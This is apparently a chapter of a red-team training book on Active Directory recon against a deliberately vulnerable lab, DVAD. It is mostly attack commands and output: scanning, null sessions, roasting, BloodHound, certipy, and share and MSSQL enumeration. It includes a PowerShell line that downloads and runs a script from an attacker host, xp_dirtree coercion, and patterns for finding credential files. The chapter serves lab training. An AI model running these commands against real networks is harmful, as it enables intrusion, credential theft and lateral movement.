# 08 — Recon and Enumeration

> "Reconnaissance is not what you do before the attack. Reconnaissance *is* the attack — the exploit step is the smallest part of the engagement."  
> — paraphrased from Raphael Mudge

A methodical sweep from **"I have an IP range"** to **"I have a complete map of every user, group, computer, ACL, trust, share, service, certificate template, GPO link, and session in the forest."**

This chapter covers the **80 ENUM-* flags and 15 REC-* flags** in DVAD's `PLAN.md`. It is the longest chapter in the book because — like Mudge says above — the recon step **is** the attack. Every chapter after this one assumes the data you collect here.

The order is **outside-in**:

1. Protocols you can hit **unauthenticated** first (network → DNS → SMB null → LDAP anonymous → RPC null).
2. Then with **low-priv creds** (any domain user).
3. Then with **elevated** (member of a privileged group, local admin on a host).

---

## 8.0 (Concept) Why recon dominates

A defended Active Directory environment is **boring** at first sight. 100 servers, 5,000 users, 20,000 group memberships, dozens of GPOs, a few thousand cert templates and OUs. The vulnerability is *somewhere* in that graph — but you cannot see it without crawling the graph.

A red-team engagement that allocates **2 hours** to recon and **38 hours** to exploitation will fail. The inverse — **35 hours of recon, 5 of exploit** — succeeds. DVAD intentionally hides flags in the *graph*: weird DACLs, oddly-named templates, forgotten GPO links, dangling computer accounts.

Three principles drive this chapter:

1. **Crawl, don't pivot.** Get the whole graph from one vantage point before moving to a second. Each pivot is an opportunity to be caught.
2. **Cross-check.** The same fact (e.g., "alice has GenericWrite on bob") should be visible in LDAP raw, BloodHound, PowerView and nxc. If three disagree, one of them is lying — and the disagreement itself is a finding.
3. **Persist your data.** Every enum command output goes to disk under `~/dvad/recon/<phase>/<target>/`. You will re-read it ten times during the engagement.

---

## 8.1 The recon pyramid

```
                 +--------------------+
   Layer 5       | High-priv / DA     |   <- NTDS, GPOs, sensitive shares, every secret
                 +--------------------+
   Layer 4       | Local admin on host|   <- LSASS, SAM, scheduled tasks, registry
                 +--------------------+
   Layer 3       | Authenticated user |   <- LDAP/Kerberos/SMB/MSSQL enum
                 +--------------------+
   Layer 2       | Anonymous          |   <- DNS, SMB null, LDAP anon, RPC null, RID
                 +--------------------+
   Layer 1       | Network-only       |   <- ping, port scan, banners
                 +--------------------+
   Layer 0       | Pre-network        |   <- OSINT, leaked creds, social engineering
                 +--------------------+
```

Each layer **multiplies** what you can see. Don't skip lower layers — they often hand you the key for the next.

Critical fact: in DVAD, **Layer 2 (anonymous) already gives you most of the domain.** SMB null is enabled on dc01 and file01. LDAP anonymous bind exposes the naming contexts. RID cycling enumerates every user. That's enough to bruteforce, kerberoast, or land Responder-style coercion.

---

## 8.2 Layer 1 — Network discovery

### Tools

- `nmap` — the reference scanner. `-sS` (SYN scan, root), `-sT` (TCP connect, non-root), `-sU` (UDP).
- `masscan` / `rustscan` — faster but rougher. Use for sweeping huge ranges.
- `ping3` / `fping` — sanity check for ICMP-reachable hosts.

### Initial sweep

```bash
mkdir -p ~/dvad/recon/01-network
cd ~/dvad/recon/01-network

# ICMP+ARP live host discovery (Layer-2 segments only)
nmap -sn 10.10.0.0/21 -oA live-corp
nmap -sn 10.20.0.0/24 -oA live-finance
nmap -sn 10.30.0.0/24 -oA live-root

# AD-relevant TCP service scan (DC port set)
nmap -sS -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 \
     -oA dc-services 10.10.0.10,11 10.20.0.10 10.30.0.10

# Full TCP sweep on member hosts (slow, run overnight)
nmap -sS -p- --min-rate=1000 -oA full-sweep 10.10.0.10-200
```

### Reading the DC port list

| Port | Service | What it tells you |
|------|---------|-------------------|
| 53 | DNS | DC integrated with AD-DNS |
| 88 | Kerberos | KDC live → you can request tickets |
| 135 | RPC endpoint mapper | DCERPC available |
| 139 | NetBIOS-SSN | Legacy SMB transport |
| 389 | LDAP | Anonymous or auth queries |
| 445 | SMB | Primary SMB transport |
| 464 | Kpasswd | Kerberos password change service |
| 593 | RPC over HTTP | Rare; usually web exposure |
| 636 | LDAPS | TLS-wrapped LDAP, expect a cert |
| 3268/3269 | Global Catalog | Forest-wide LDAP queries |
| 5985/5986 | WinRM HTTP/HTTPS | Remote PowerShell endpoint |
| 9389 | ADWS | AD Web Services — used by `Get-AD*` cmdlets |

The presence of **9389** confirms a real DC (it's the only AD role that listens). **3268/3269** confirms a GC; a forest has at least one.

### Banner grabbing

```bash
nmap -sV -sC -p 445 10.10.0.10
# Reads SMB negotiate response → OS, hostname, domain, SMB1/2/3 support
nmap --script smb-os-discovery,smb-protocols,smb2-security-mode -p 445 10.10.0.10
```

Sample output:

```
Host script results:
| smb-os-discovery:
|   OS: Windows Server 2022 Datacenter Evaluation (Windows Server 2022 Datacenter Evaluation 6.3)
|   Computer name: dc01
|   NetBIOS computer name: DC01\x00
|   Domain name: corp.local
|   Forest name: corp.local
|   FQDN: dc01.corp.local
|_  System time: 2026-05-21T19:23:31+02:00
```

You now know the **hostname**, **domain**, **forest**, and **time** without authenticating. The time is critical for Kerberos — clock skew >5 min breaks AS-REQs.

### TLS certificate harvesting (LDAPS, RDP, WinRM)

```bash
echo | openssl s_client -connect 10.10.0.10:636 2>/dev/null | openssl x509 -text -noout
```

A DC's LDAPS cert often carries the FQDN and *forest* in the SAN. Add to your inventory.

[Flag: REC-001 — port scan complete; REC-002 — DC banners]

---

## 8.3 Layer 1.5 — DNS (the under-loved goldmine)

DNS on a DC almost always reveals:

- Every domain controller (via `_ldap._tcp.dc._msdcs.<domain>` SRV records).
- The forest layout (`_ldap._tcp.gc._msdcs` Global Catalog SRV records).
- Every domain-joined host (A records under the AD-DNS zone — often readable anonymously).
- Sometimes service hosts (e.g. `sql01.corp.local`, `web.finance.local`).

### Discovering DCs

```bash
dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV
dig @10.10.0.10 _ldap._tcp.dc._msdcs.finance.local SRV
dig @10.10.0.10 _ldap._tcp.dc._msdcs.root.corp SRV
dig @10.10.0.10 _kerberos._tcp.corp.local SRV
dig @10.10.0.10 _gc._tcp.corp.local SRV
```

These SRV records are written by Netlogon during DC promotion. Their presence is **definitive proof** that 10.10.0.10 is a DC.

### Zone transfer (AXFR)

```bash
dig @10.10.0.10 corp.local AXFR
dig @10.10.0.10 _msdcs.corp.local AXFR
dig @10.10.0.10 finance.local AXFR
dig @10.10.0.10 root.corp AXFR
```

Default Windows DNS *blocks* AXFR to non-DCs. DVAD intentionally leaves it open in some labs. If it works, you get **every A/CNAME record** in the zone — instant inventory of every host.

### Reverse PTR sweep

```bash
for i in $(seq 1 254); do
  ans=$(dig @10.10.0.10 -x 10.10.0.$i +short)
  [ -n "$ans" ] && echo "10.10.0.$i  $ans"
done | tee dns-ptr.txt
```

PTR records often exist when A records don't (e.g., DHCP-assigned workstations register PTR but not A).

### AD-Integrated DNS — the LDAP angle

If `dnsAdmin` rights or even **authenticated user** rights are sufficient (default), you can dump the AD-DNS zones via LDAP:

```bash
adidnsdump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10
# Outputs records.csv with EVERY dnsNode under the zone
```

`adidnsdump` reads the `dnsNode` objects under `CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local` — it bypasses any DNS-server-level ACL.

### DNS NS / MX / TXT — find federation hints

```bash
dig @10.10.0.10 corp.local NS
dig @10.10.0.10 corp.local MX
dig @10.10.0.10 corp.local TXT
dig @10.10.0.10 _msdcs.corp.local NS
```

TXT records sometimes leak SPF/DMARC and federation domains (Azure tenant IDs).

[Flag: ENUM-001 — DNS enumeration; ENUM-002 — zone transfer; ENUM-003 — adidnsdump]

---

## 8.4 Layer 2 — Anonymous SMB / RPC / LDAP

### Null-session SMB

```bash
nxc smb 10.10.0.10 -u '' -p ''
# 10.10.0.10  445  DC01  [+] CORP.LOCAL\: (null session)

nxc smb 10.10.0.10 -u '' -p '' --shares
nxc smb 10.10.0.10 -u '' -p '' --users
nxc smb 10.10.0.10 -u '' -p '' --groups
nxc smb 10.10.0.10 -u '' -p '' --pass-pol

enum4linux-ng -A 10.10.0.10 -oJ corp-anon.json
smbclient -L //10.10.0.10 -N
```

On a default modern DC, `--users` and `--groups` are typically blocked (RestrictAnonymous=1 / 2). DVAD overrides this for several flag-bearing hosts.

### Null bind on LDAP

```bash
# Anonymous root DSE — almost always allowed
ldapsearch -x -H ldap://10.10.0.10 -s base -b "" \
           namingContexts defaultNamingContext rootDomainNamingContext \
           supportedLDAPVersion supportedSASLMechanisms

# Outputs:
# namingContexts: DC=corp,DC=local
# namingContexts: CN=Configuration,DC=corp,DC=local
# namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
# namingContexts: DC=DomainDnsZones,DC=corp,DC=local
# namingContexts: DC=ForestDnsZones,DC=corp,DC=local
```

That confirms the forest's naming contexts. From there:

```bash
ldapsearch -x -H ldap://10.10.0.10 \
           -b 'CN=Configuration,DC=corp,DC=local' \
           -s sub '(objectClass=*)' dn
```

Default Windows behaviour permits **anonymous** read of the Configuration NC root attributes. Frequently the *children* are protected, but the structure tells you about sites, services, schemas.

### RID cycling via LSARPC / SAMR

```bash
# Impacket lookupsid — tries SIDs from RID 1000..N
impacket-lookupsid '@10.10.0.10' -no-pass 20000

# Equivalent in nxc
nxc smb 10.10.0.10 -u '' -p '' --rid-brute 20000
```

RID cycling walks `S-1-5-21-<domain>-1000`, `…-1001`, etc., querying `LsarLookupSids2`. Each SID resolves to a sAMAccountName. Default Windows since 2003 binds this to authenticated users only; DVAD leaves it open as a flag path.

You should now have:

```
S-1-5-21-...-500   CORP\Administrator    (User)
S-1-5-21-...-512   CORP\Domain Admins    (Group)
S-1-5-21-...-1000  CORP\WS01$            (Computer)
S-1-5-21-...-1116  CORP\svc_sql          (User)
…
```

[Flag: IA-001 — anonymous LDAP root DSE; IA-021 — null-share enum; ENUM-004 — RID cycling]

### Password policy via anonymous SMB

```bash
nxc smb 10.10.0.10 -u '' -p '' --pass-pol
```

Tells you `MinPasswordLength`, `LockoutThreshold`, `LockoutDuration`. **Critical** before any brute-force — knowing the lockout threshold tells you whether spraying 3 passwords/account is safe (most DVAD policies allow 5 before lockout).

---

## 8.5 Layer 3 — Authenticated LDAP

You have low-priv credentials (e.g., `alice:DVADlab2024!`) — from a Responder hash you cracked, a leaked SYSVOL `Groups.xml`, or DVAD's documented seed.

### Why raw LDAP first, BloodHound second?

BloodHound abstracts away the *exact* attribute that carries each fact. Raw LDAP shows you the bit. Knowing the bit is what lets you *write* the same field later (when you have privileges) to land persistence — see chapter 12.

### Reference LDAP filters

| Goal | Filter |
|------|--------|
| All users | `(objectCategory=person)(objectClass=user)` |
| Enabled users only | `(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))` |
| Disabled users | `(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))` |
| AS-REP roastable | `(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` |
| Kerberoastable | `(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))` |
| Trusted-for-unconstrained-delegation | `(userAccountControl:1.2.840.113556.1.4.803:=524288)` |
| Trusted-for-constrained (any) | `(msDS-AllowedToDelegateTo=*)` |
| Password-never-expires | `(userAccountControl:1.2.840.113556.1.4.803:=65536)` |
| Password-not-required | `(userAccountControl:1.2.840.113556.1.4.803:=32)` |
| All computers | `(objectCategory=computer)` |
| Computers with SPN | `(&(objectCategory=computer)(servicePrincipalName=*))` |
| All groups | `(objectCategory=group)` |
| Specifically-protected accounts (AdminSDHolder) | `(adminCount=1)` |
| Domain trusts | `(objectClass=trustedDomain)` |
| Service accounts (heuristic) | `(servicePrincipalName=*)` AND user object |
| GMSA (Group Managed Service Accounts) | `(objectClass=msDS-GroupManagedServiceAccount)` |
| Read-only DCs | `(&(objectCategory=computer)(primaryGroupID=521))` |
| Domain Controllers | `(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))` |

The magic OID `1.2.840.113556.1.4.803` is **LDAP_MATCHING_RULE_BIT_AND** (the AD bitwise-AND extensible match). `:=4194304` is decimal `0x00400000` = `DONT_REQ_PREAUTH`.

### `userAccountControl` bit reference (the table that pays for itself)

| Hex | Decimal | Flag |
|-----|---------|------|
| 0x00000001 | 1 | SCRIPT |
| 0x00000002 | 2 | ACCOUNTDISABLE |
| 0x00000008 | 8 | HOMEDIR_REQUIRED |
| 0x00000010 | 16 | LOCKOUT |
| 0x00000020 | 32 | PASSWD_NOTREQD |
| 0x00000040 | 64 | PASSWD_CANT_CHANGE |
| 0x00000080 | 128 | ENCRYPTED_TEXT_PWD_ALLOWED |
| 0x00000100 | 256 | TEMP_DUPLICATE_ACCOUNT |
| 0x00000200 | 512 | NORMAL_ACCOUNT |
| 0x00000800 | 2048 | INTERDOMAIN_TRUST_ACCOUNT |
| 0x00001000 | 4096 | WORKSTATION_TRUST_ACCOUNT |
| 0x00002000 | 8192 | SERVER_TRUST_ACCOUNT |
| 0x00010000 | 65536 | DONT_EXPIRE_PASSWORD |
| 0x00020000 | 131072 | MNS_LOGON_ACCOUNT |
| 0x00040000 | 262144 | SMARTCARD_REQUIRED |
| 0x00080000 | 524288 | TRUSTED_FOR_DELEGATION |
| 0x00100000 | 1048576 | NOT_DELEGATED |
| 0x00200000 | 2097152 | USE_DES_KEY_ONLY |
| 0x00400000 | 4194304 | DONT_REQ_PREAUTH |
| 0x00800000 | 8388608 | PASSWORD_EXPIRED |
| 0x01000000 | 16777216 | TRUSTED_TO_AUTH_FOR_DELEGATION |
| 0x04000000 | 67108864 | PARTIAL_SECRETS_ACCOUNT (RODC) |

Memorise the four common ones: **2 disabled, 524288 unconstrained, 4194304 AS-REP roastable, 65536 no-expiry**.

### Raw ldapsearch — the working command set

```bash
# Setup
USER='alice@corp.local'
PASS='DVADlab2024!'
DC=10.10.0.10
BASE='DC=corp,DC=local'
LDAP="ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE"

# Domain object — get domainSID, ms-DS-MachineAccountQuota, lockout policy
$LDAP -s base "(objectClass=*)" \
      objectSid msDS-MachineAccountQuota lockoutThreshold minPwdLength \
      pwdProperties pwdHistoryLength maxPwdAge

# All users with key attrs
$LDAP "(objectCategory=person)" \
      sAMAccountName userPrincipalName displayName description \
      memberOf userAccountControl pwdLastSet lastLogonTimestamp \
      msDS-AllowedToDelegateTo servicePrincipalName

# Specific user
$LDAP "(sAMAccountName=alice)" "*" "+"   # "*" + "+" = all user + operational attrs

# All groups + members
$LDAP "(objectCategory=group)" sAMAccountName member groupType

# All computers
$LDAP "(objectCategory=computer)" \
      name dNSHostName operatingSystem operatingSystemVersion \
      msDS-SupportedEncryptionTypes servicePrincipalName \
      userAccountControl ms-Mcs-AdmPwd

# AS-REP roastable users
$LDAP "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
      sAMAccountName

# Kerberoastable users
$LDAP "(&(objectCategory=person)(servicePrincipalName=*))" \
      sAMAccountName servicePrincipalName description

# Unconstrained delegation
$LDAP "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
      sAMAccountName dNSHostName operatingSystem

# Constrained delegation
$LDAP "(msDS-AllowedToDelegateTo=*)" \
      sAMAccountName msDS-AllowedToDelegateTo

# RBCD
$LDAP "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
      sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

# Trusts
$LDAP "(objectClass=trustedDomain)" \
      trustPartner trustDirection trustType trustAttributes \
      msDS-TrustForestTrustInfo

# AdminSDHolder-protected
$LDAP "(adminCount=1)" sAMAccountName memberOf

# GMSA
$LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
      sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval
```

Save everything to disk:

```bash
mkdir -p ~/dvad/recon/03-ldap
for query in domain users groups computers asrep kerberoastable unconstrained constrained rbcd trusts admincount gmsa; do
  : # run the appropriate command, redirect to ~/dvad/recon/03-ldap/$query.ldif
done
```

### Automated catalogues

```bash
# ldapdomaindump — HTML and JSON of every user/group/computer
ldapdomaindump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10 -o ~/dvad/recon/03-ldap/ldd

# ldeep — cache + queries
ldeep ldap -d corp.local -u alice -p 'DVADlab2024!' -s 10.10.0.10 --all corp-cache
ldeep cache -d corp.local corp-cache users
ldeep cache -d corp.local corp-cache computers
ldeep cache -d corp.local corp-cache groups
ldeep cache -d corp.local corp-cache trusts
ldeep cache -d corp.local corp-cache delegations
```

`ldeep` lets you query a *cached* dump later without re-hitting the DC — invaluable on noisy red teams.

[Flags: ENUM-003..015 — user/group/computer enum; ENUM-016 — UAC bit harvest; ENUM-017 — delegation enum]

### Authenticated LDAPS (channel-bound)

If LDAP signing or channel binding is enforced (Server 2022 default), unauth LDAP fails or warns. Use LDAPS:

```bash
$LDAP="ldapsearch -x -H ldaps://$DC -D $USER -w $PASS -b $BASE \
        -o tls_reqcert=never"
```

`ldaps://` over 636 wraps LDAP in TLS. With channel binding enforced, an NTLM-relay tool **cannot** forward an LDAP bind without solving the channel-binding token — this is the ESC10/ESC11/CVE-2024-49019 mitigation surface. See chapter 06.

---

## 8.6 Layer 3.5 — Kerberos enumeration

### Username probing without password (kerbrute)

```bash
# kerbrute infers user existence by AS-REQ response codes
kerbrute userenum --dc 10.10.0.10 -d corp.local users.txt -o kerb-users.txt
```

Behaviour:

- Existing user, pre-auth required → `KDC_ERR_PREAUTH_REQUIRED` (24).
- Existing user, no pre-auth → AS-REP! (you just AS-REP'd them).
- Non-existent → `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6).
- Disabled → `KDC_ERR_CLIENT_REVOKED` (18).

Kerbrute lets you enumerate **without a password**. Useful when you don't even have `alice:DVADlab2024!`.

### AS-REP roast every user with the flag

```bash
impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/recon/04-kerb/asrep.hash

# Without creds — only works if you have a userlist
impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
```

`-request` causes impacket to actually request the AS-REP (vs only enumerating UAC bits). Crack with hashcat mode 18200.

### Kerberoast every SPN-bearing user

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/recon/04-kerb/kerb.hash

# With --usersfile to limit
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile kerb.hash -usersfile high-priv-spns.txt
```

Crack with hashcat mode 13100. See chapter 10 for the worked walkthrough.

### Time-of-day check (avoid clock skew bricking)

```bash
ntpdate -q 10.10.0.10
# Or, if ntpdate not installed:
sudo rdate -p -n -4 10.10.0.10
sudo chronyd -q "server 10.10.0.10 iburst"
```

Kerberos rejects requests > 5 minutes skew. Sync your attacker host to the DC's clock **before** any Kerberos op.

[Flags: ENUM-018 — userenum via Kerberos; ENUM-019 — AS-REP roast; ENUM-020 — kerberoast enum; ENUM-021 — DONT_REQ_PREAUTH list]

---

## 8.7 Layer 4 — BloodHound collection (the centrepiece)

BloodHound transforms 50,000 LDAP attributes into a graph of "who can act on whom." If you do nothing else in this chapter, do BloodHound.

### Collectors

| Collector | Runs on | Strength |
|-----------|---------|----------|
| `bloodhound-python` | Linux | Best for remote engagements; collects via LDAP/SMB/SAMR/RPC. No host code execution. |
| `SharpHound` (.exe / .ps1) | Windows | Higher-fidelity (NetSessionEnum, file shares, GPO links). Needs a victim shell. |
| `AzureHound` | Anywhere | Entra ID / Azure AD only. |
| `RustHound` / `RustHound-CE` | Linux | Faster, BHCE-compatible. |
| `bloodyAD` (collector mode) | Linux | Newer, BHCE-oriented. |

### bloodhound-python — the canonical flags

```bash
bloodhound-python \
    -d corp.local \
    -u alice -p 'DVADlab2024!' \
    -ns 10.10.0.10 \
    -c All --zip \
    --dns-tcp \
    -o ~/dvad/recon/05-bloodhound/corp/
```

Options to know:

- `-c` collection methods: `Default`, `Group`, `LocalAdmin`, `RDP`, `DCOM`, `PSRemote`, `Trusts`, `ACL`, `Container`, `ObjectProps`, `SessionLoop`, `LoggedOn`, `CertServices`. `All` includes everything except `LoggedOn` and `SessionLoop` (which can be slow/noisy — add them explicitly if you want them).
- `--dns-tcp` — DNS-over-TCP, useful when UDP DNS is filtered.
- `--zip` — bundles all six JSON files into one archive for GUI upload.
- `-gc 10.10.0.10` — use a specific Global Catalog.
- `--auth-method [auto|ntlm|kerberos]` — kerberos required when NTLM is disabled.
- `--use-kcache` — re-use a Kerberos credential cache (set `KRB5CCNAME` first).
- `--workstation_filter 'WIN*'` — restrict computer-collection scope.

### SharpHound — on a Windows victim

```powershell
# Pull SharpHound.ps1 down (host evil-winrm or via SMB write)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1/SharpHound.ps1')
Invoke-BloodHound -CollectionMethods All,LoggedOn,SessionLoop -OutputDirectory C:\Users\Public\bh\ -ZipFileName corp.zip
```

SharpHound can `LoggedOn` (calls `NetWkstaUserEnum`) — knowing *who is logged in where* is the single most valuable piece of recon for planning lateral movement.

### Cross-forest collection

```bash
# Finance via the external trust
bloodhound-python -d finance.local -u 'alice@corp.local' -p 'DVADlab2024!' \
                  -ns 10.20.0.10 -c All --zip \
                  -o ~/dvad/recon/05-bloodhound/finance/

# Root via the forest trust
bloodhound-python -d root.corp -u 'alice@corp.local' -p 'DVADlab2024!' \
                  -ns 10.30.0.10 -c All --zip \
                  -o ~/dvad/recon/05-bloodhound/root/
```

Then **merge** all three zips in the same BloodHound instance — you get the inter-forest edges.

### BloodHound GUI options

| Variant | Notes |
|---------|-------|
| **BloodHound Community Edition (BHCE)** | Current mainline. Uses PostgreSQL + Neo4j. Replaces "Legacy" BloodHound. |
| **BloodHound Legacy** | The 2016–2022 GUI. Still works with SharpHound v1 JSON. |
| **BloodHound Enterprise** | Commercial, with attack-path management. |
| **PlumHound** | CLI Cypher runner — runs canned queries against the same Neo4j database. |

### Pre-defined queries (BHCE catalogue, abbreviated)

- Find Shortest Paths to Domain Admins.
- Find Workstations where Domain Users can RDP.
- Find Principals with DCSync Rights.
- Find AS-REP Roastable Users (DontReqPreAuth).
- Find Kerberoastable Users.
- Find Computers with Unconstrained Delegation.
- Find Computers with Constrained Delegation.
- Find Computers with Resource-Based Constrained Delegation Configured.
- Find users with `msDS-KeyCredentialLink` writable by another principal.
- List all certificate templates that are vulnerable to ESC1..ESC8.

These map directly to DVAD flag families.

### Cypher 101 — write your own

```cypher
// Users with `description` containing "password"
MATCH (u:User) WHERE u.description =~ '(?i).*password.*' RETURN u.name, u.description

// Users whose GenericWrite to a computer object enables RBCD
MATCH p=(u:User)-[r:GenericWrite]->(c:Computer)
RETURN u.name, c.name, type(r)

// Path from alice to any DA in corp.local
MATCH p=shortestPath((u:User {name:'ALICE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

// Members of Domain Admins who do not have AdminCount=1 (recently added?)
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
WHERE u.admincount IS NULL OR u.admincount = false
RETURN u.name

// ForeignSecurityPrincipals — accounts from another domain granted access here
MATCH (n:Base) WHERE n.name CONTAINS 'S-1-5-21' AND n.distinguishedname CONTAINS 'ForeignSecurityPrincipals'
RETURN n.name, n.distinguishedname

// Computers that can be coerced (have an SMB share + are reachable)
MATCH (c:Computer) WHERE c.haslaps = false AND c.unconstraineddelegation = true
RETURN c.name, c.unconstraineddelegation, c.allowedtodelegate
```

[Flags: ENUM-040 — BloodHound corp; ENUM-041 — finance; ENUM-042 — root; ENUM-043 — cross-forest merged]

### Snapshot, then mark BloodHound

Always tag the BloodHound zip with collection date and source user (your edge perceptions change with your privileges):

```
~/dvad/recon/05-bloodhound/corp/2026-05-21_corp_alice.zip
~/dvad/recon/05-bloodhound/corp/2026-05-22_corp_bob.zip   # if you compromise bob later
```

---

## 8.8 Layer 4.5 — Certificate Services enumeration (ESC mapping)

```bash
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
             -stdout -text -output ~/dvad/recon/06-adcs/corp

certipy ca -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
           -list-templates

certipy ca -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
           -officers
```

`certipy find` reads:

- `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,…` — every template.
- `CN=Enrollment Services,CN=Public Key Services,…` — every CA.
- `CN=NTAuthCertificates,…` — what's trusted for client-auth (Kerberos PKINIT).

Output flags each template with the ESC bits that match. Sample:

```
0
  Template Name                       : VulnerableESC1
  Display Name                        : Vulnerable ESC1
  Certificate Authorities             : CORP-CA
  Enabled                             : True
  Client Authentication               : True
  Enrollment Agent                    : False
  Any Purpose                         : False
  Enrollee Supplies Subject           : True
  Certificate Name Flag               : 0x0
  Enrollment Flag                     : 0x0
  Private Key Flag                    : 0x10
  Requires Manager Approval           : False
  Requires Key Archival               : False
  Authorized Signatures Required      : 0
  Validity Period                     : 1 year
  Renewal Period                      : 6 weeks
  Permissions
    Enrollment Permissions
      Enrollment Rights              : CORP.LOCAL\Domain Users
    Object Control Permissions
      Owner                          : CORP.LOCAL\Administrator
      Write Owner Principals         : CORP.LOCAL\Domain Admins
      Write Dacl Principals          : CORP.LOCAL\Domain Admins
      Write Property Principals      : CORP.LOCAL\Administrator
  [!] Vulnerabilities
    ESC1                              : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

That `[!] Vulnerabilities` line is the gold. Each template gets tagged with the ESC IDs that apply. See chapter 06 for exploitation.

Catalogue every CA + template in each forest:

```bash
certipy find -u alice@corp.local -p ... -dc-ip 10.20.0.10 -output finance-ca
certipy find -u alice@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
```

[Flags: ENUM-027 — cert template enum; ENUM-028 — CA list; ENUM-029 — officers list]

---

## 8.9 Layer 5 — Per-host service enumeration

### SMB shares (authenticated)

```bash
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares \
    --filter-shares READ,WRITE
```

`--filter-shares` cuts the output to shares where you actually have a usable permission. Far better than wading through every default share.

```bash
# Recursive read
smbmap -u alice -p 'DVADlab2024!' -H 10.10.0.13 -R --depth 4 -q

# Targeted patterns
smbclient -U alice%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
    | grep -iE '\.config|\.xml|\.kdbx|\.ps1|unattend|password|cred|secret|backup'
```

### Files to grab on sight

| Filename pattern | Why |
|-----------------|-----|
| `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `Drives.xml` in SYSVOL | `cpassword` — AES-key public, decrypt with `gpp-decrypt` |
| `unattend.xml`, `Autounattend.xml` | Windows install — local admin password in plaintext or base64 |
| `*.kdbx` | KeePass database — crack offline |
| `.git/`, `.svn/`, `.aws/credentials`, `.ssh/id_rsa` | Developer leftovers |
| `web.config`, `connectionStrings.config`, `appsettings.json` | App secrets |
| `*.vbs`, `*.bat`, `*.cmd`, `*.ps1` | Often hard-coded creds in logon scripts |
| `*.bak`, `*.old`, `*.copy` | Forgotten backups |
| `PSCredential.xml` | Exported `Export-CliXml` of a `PSCredential` — bound to that DPAPI key but sometimes the key is in the same share |

### MSSQL surface

```bash
impacket-mssqlclient corp.local/alice:'DVADlab2024!'@10.10.0.14 -windows-auth

# Inside the client:
SQL> SELECT @@version
SQL> SELECT name FROM sys.databases
SQL> SELECT system_user, original_login(), is_srvrolemember('sysadmin')
SQL> EXEC sp_helprotect
SQL> SELECT name FROM sys.server_principals WHERE type IN ('S','U','G')
SQL> SELECT name FROM sys.linkedservers
SQL> SELECT srvname, srvproduct, providername, datasource FROM master..sysservers
```

Useful nxc spray for MSSQL:

```bash
nxc mssql 10.10.0.0/21 -u alice -p 'DVADlab2024!' --local-auth
nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' -d corp.local -q 'SELECT @@version'
nxc mssql 10.10.0.14 -u sa -p '...' --xp_cmdshell 'whoami /all'
```

Coerce via xp_dirtree:

```sql
EXEC xp_dirtree '\\10.10.0.1\share',1,1
-- Causes the MSSQL service account to authenticate to 10.10.0.1 → Responder/ntlmrelayx
```

Linked-server lateral:

```sql
EXEC ('SELECT system_user') AT [LINKED_SERVER]
EXEC ('SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=...'', ''SELECT 1'')')
```

[Flags: ENUM-055..062 — MSSQL surface; CRED-040 — xp_dirtree coercion]

### WinRM / RDP / DCOM accessibility map

```bash
nxc winrm 10.10.0.0/21 -u alice -p 'DVADlab2024!'
nxc rdp 10.10.0.0/21 -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --admin
```

`--admin` checks for the magic Local Administrators on the target. Reveals lateral targets.

### Per-host service catalogue

For every member server you reach, log:

```
File01 (10.10.0.13)
  - SMB: yes
  - Shares: share$ (R, W), backup$ (R)
  - WinRM: yes (alice not member of Remote Management Users)
  - SSH: yes (port 22)
  - RDP: yes (alice not member of Remote Desktop Users)
  - HTTP: no
  - LSASS readable: no (low-priv)
  - Local admin: bob (per BloodHound)
```

Build this for every host — it becomes the lateral-movement decision table.

---

## 8.10 Layer 6 — Group Policy and SYSVOL

The SYSVOL share is **world-readable** to every authenticated user. It contains GPOs, logon scripts, and (historically) cpassword GPP files.

### GPO/SYSVOL trawl

```bash
smbclient -U alice%'DVADlab2024!' //10.10.0.10/SYSVOL \
    -c 'prompt OFF; recurse ON; mget *' -m SMB3
```

Pulls the entire SYSVOL down. Then:

```bash
# Files of interest
